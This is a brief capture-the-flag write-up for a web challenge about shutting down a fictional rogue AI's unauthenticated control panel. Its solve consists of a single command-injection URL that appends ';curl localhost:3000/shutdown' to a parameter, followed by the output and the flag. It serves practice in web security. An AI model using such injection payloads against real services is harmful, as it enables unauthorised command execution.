# # Control Panel [Web]

### 150

Agent, we've identified what appears to be ARIA's control panel. Luckily there's no authentication required to interact with it. Can you take down ARIA once and for all?

[https://uscybercombine-s4-control-panel.chals.io/](https://uscybercombine-s4-control-panel.chals.io/)

 [control-panel.zip](https://ctfd.uscybergames.com/files/d610c5bfacbc496adf06f2207ee24a34/control-panel.zip?token=eyJ1c2VyX2lkIjoxNzE0LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyNzV9.ZlpSzQ.bt7nY2pjRlgm54pPl5WNI_8grI0)

## Solve

```

```

```
https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=check_status;curl%20-s%20localhost:3000/shutdown

```

```
{"status": "ready to destroy"}{"status": "shutting down..."}{"status": "SIVBGR{g00dby3_ARI4}"}
```